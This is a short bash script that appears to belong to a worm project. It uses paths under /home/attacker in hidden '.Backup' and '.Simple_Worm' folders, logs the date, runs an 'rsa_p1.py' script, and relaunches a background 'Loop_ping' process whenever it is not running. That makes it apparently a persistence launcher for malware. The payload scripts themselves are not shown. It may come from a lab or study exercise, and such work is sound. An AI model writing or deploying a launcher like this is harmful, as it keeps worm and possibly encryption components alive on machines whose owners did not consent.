#!/bin/bash

en1_path="/home/attacker/Desktop/.Backup"
en2_path="/home/attacker/Public/.Simple_Worm/Loop"


date >> $en2_path/test

if [ -d $en1_path ] 
then
    echo "Directory path1 exists." 
    python3 $en1_path/rsa_p1.py
	if pgrep Loop_ping > /dev/null
	then
	    echo "Yes Loop now. p1" # >> $en2_path/test
	else 
	    echo "No Loop new. p1" # >> $en2_path/test
	    $en1_path/Loop_ping &
	fi
else 
	if [ -d $en2_path ] 
	then
	    echo "Directory path2 exists." 
	fi
fi